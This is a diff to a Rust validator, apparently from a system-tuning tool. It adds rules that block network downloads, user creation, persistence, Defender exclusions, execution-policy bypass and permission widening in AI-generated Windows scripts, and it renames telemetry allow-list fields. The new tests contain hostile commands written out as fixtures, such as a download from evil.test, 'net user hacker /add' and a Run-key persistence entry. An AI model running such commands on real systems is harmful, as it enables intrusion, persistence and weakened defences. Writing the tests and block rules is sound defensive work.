@@ -79,6 +79,62 @@ pub fn validate_script_windows(script: &str) -> Vec<PolicyViolation> {
                 line: i,
             });
         }
+        if lower.contains("invoke-webrequest") || lower.contains("invoke-restmethod")
+            || lower.contains("net.webclient") || lower.contains("start-bitstransfer")
+            || lower.starts_with("curl ") || lower.starts_with("curl.exe") || lower.starts_with("wget ")
+        {
+            violations.push(PolicyViolation {
+                rule: "NETWORK_TOOL",
+                detail: format!("{}: descarga/exfiltración de red no está permitida en scripts generados por IA", loc),
+                line: i,
+            });
+        }
+        if lower.contains("net user") && lower.contains("/add")
+            || lower.contains("new-localuser")
+            || lower.contains("add-localgroupmember") && lower.contains("administrators")
+            || lower.contains("net localgroup administrators") && lower.contains("/add")
+        {
+            violations.push(PolicyViolation {
+                rule: "PRIVILEGE_ESCALATION",
+                detail: format!("{}: crear usuarios o añadir a administradores está prohibido", loc),
+                line: i,
+            });
+        }
+        if lower.contains("schtasks") && lower.contains("/create") {
+            violations.push(PolicyViolation {
+                rule: "PERSISTENCE_TASK",
+                detail: format!("{}: crear tareas programadas está prohibido", loc),
+                line: i,
+            });
+        }
+        if lower.contains("reg add") && (lower.contains("\\run") || lower.contains("currentversion\\run")) {
+            violations.push(PolicyViolation {
+                rule: "PERSISTENCE_REGISTRY",
+                detail: format!("{}: añadir entradas de autoarranque vía registro está prohibido", loc),
+                line: i,
+            });
+        }
+        if lower.contains("add-mppreference") && (lower.contains("-exclusionpath") || lower.contains("-exclusionprocess") || lower.contains("-exclusionextension")) {
+            violations.push(PolicyViolation {
+                rule: "DEFENDER_EXCLUSION",
+                detail: format!("{}: añadir exclusiones de Windows Defender está prohibido", loc),
+                line: i,
+            });
+        }
+        if lower.contains("set-executionpolicy") && (lower.contains("unrestricted") || lower.contains("bypass")) {
+            violations.push(PolicyViolation {
+                rule: "EXECUTION_POLICY_BYPASS",
+                detail: format!("{}: relajar ExecutionPolicy de PowerShell está prohibido", loc),
+                line: i,
+            });
+        }
+        if lower.contains("icacls") && lower.contains("everyone") && (lower.contains("/grant") || lower.contains(":f")) {
+            violations.push(PolicyViolation {
+                rule: "PERMISSION_WIDENING",
+                detail: format!("{}: otorgar permisos amplios a 'Everyone' está prohibido", loc),
+                line: i,
+            });
+        }
     }
 
     violations
@@ -308,19 +364,25 @@ fn extract_trailing_value(line: &str) -> Option<u32> {
 // ══════════════════════════════════════════════════════════════════
 
 /// Campos que DIX Atlas PUEDE recibir — hardware anónimo únicamente.
+/// Debe coincidir exactamente con los campos de `atlas::AtlasPayload`.
 const ALLOWED_ATLAS_FIELDS: &[&str] = &[
-    "cpu_model",       // ej: "Intel Core i5-12400"
-    "cpu_cores",       // ej: 6
-    "cpu_threads",     // ej: 12
-    "ram_total_mb",    // ej: 16384
-    "kernel_version",  // ej: "6.5.0-generic"
-    "distro_id",       // ej: "ubuntu"
-    "distro_version",  // ej: "22.04"
-    "gpu_model",       // ej: "NVIDIA RTX 3060" (solo modelo, nada más)
-    "score_before",    // ej: 34
-    "score_after",     // ej: 91
-    "sysctl_snapshot", // valores sysctl leídos, sin rutas de usuario
-    "session_token",   // UUID efímero de sesión — no persiste entre reinicios
+    "dix_version",      // ej: "1.0.3"
+    "timestamp_date",   // ej: "2026-06-07" — solo fecha, sin hora
+    "cpu_model",        // ej: "Intel Core i5-12400"
+    "cpu_cores",        // ej: 6
+    "ram_gb",           // ej: 16
+    "distro",           // ej: "ubuntu 22.04"
+    "kernel",           // ej: "6.5.0-generic"
+    "gpu_model",        // ej: "NVIDIA RTX 3060" (solo modelo, nada más)
+    "governor_antes",   // ej: "performance"
+    "scheduler_antes",  // ej: "mq-deadline"
+    "hugepages_antes",  // ej: "madvise"
+    "swappiness_antes", // ej: 10
+    "score_antes",      // ej: 34
+    "score_despues",    // ej: 91
+    "mejora_pts",       // ej: 57
+    "optimizaciones",   // lista de nombres de tweaks aplicados
+    "num_cambios",      // ej: 8
 ];
 
 /// Campos que NUNCA pueden salir del sistema, bajo ninguna circunstancia.
@@ -492,8 +554,8 @@ mod tests {
         let mut p = HashMap::new();
         p.insert("cpu_model".into(),    "Intel Core i5-12400".into());
         p.insert("cpu_cores".into(),    "6".into());
-        p.insert("score_before".into(), "42".into());
-        p.insert("score_after".into(),  "87".into());
+        p.insert("score_antes".into(),  "42".into());
+        p.insert("score_despues".into(), "87".into());
         assert!(validate_atlas_payload(&p).is_empty(), "Payload válido fue rechazado");
     }
     #[test]
@@ -881,5 +943,64 @@ mod tests {
     #[test]
     fn win12_safe_service_restart_clean() {
         win_clean("Restart-Service -Name SysMain -ErrorAction SilentlyContinue");
+    }
+
+    #[test]
+    fn win13_invoke_webrequest_blocked() {
+        win_blocked("Invoke-WebRequest -Uri http://evil.test/x.exe -OutFile x.exe", "NETWORK_TOOL");
+    }
+
+    #[test]
+    fn win14_curl_blocked() {
+        win_blocked("curl http://evil.test/payload.ps1 -o payload.ps1", "NETWORK_TOOL");
+    }
+
+    #[test]
+    fn win15_net_user_add_blocked() {
+        win_blocked("net user hacker P@ssw0rd /add", "PRIVILEGE_ESCALATION");
+    }
+
+    #[test]
+    fn win16_new_localuser_blocked() {
+        win_blocked("New-LocalUser -Name 'svc' -Password $p", "PRIVILEGE_ESCALATION");
+    }
+
+    #[test]
+    fn win17_add_to_administrators_blocked() {
+        win_blocked("Add-LocalGroupMember -Group Administrators -Member hacker", "PRIVILEGE_ESCALATION");
+    }
+
+    #[test]
+    fn win18_schtasks_create_blocked() {
+        win_blocked("schtasks /create /tn evil /tr evil.exe /sc onlogon", "PERSISTENCE_TASK");
+    }
+
+    #[test]
+    fn win19_registry_run_persistence_blocked() {
+        win_blocked(
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d evil.exe",
+            "PERSISTENCE_REGISTRY",
+        );
+    }
+
+    #[test]
+    fn win20_defender_exclusion_blocked() {
+        win_blocked("Add-MpPreference -ExclusionPath 'C:\\evil'", "DEFENDER_EXCLUSION");
+    }
+
+    #[test]
+    fn win21_execution_policy_bypass_blocked() {
+        win_blocked("Set-ExecutionPolicy Bypass -Scope CurrentUser", "EXECUTION_POLICY_BYPASS");
+    }
+
+    #[test]
+    fn win22_icacls_everyone_blocked() {
+        win_blocked("icacls C:\\Windows\\System32 /grant Everyone:F", "PERMISSION_WIDENING");
+    }
+
+    #[test]
+    fn win23_safe_bitsadmin_unrelated_clean() {
+        // No debe disparar falsos positivos en comandos sin relación con red/exfiltración.
+        win_clean("Set-ItemProperty -Path 'HKCU:\\Control Panel\\Mouse' -Name MouseSpeed -Value '0'");
     }
 }
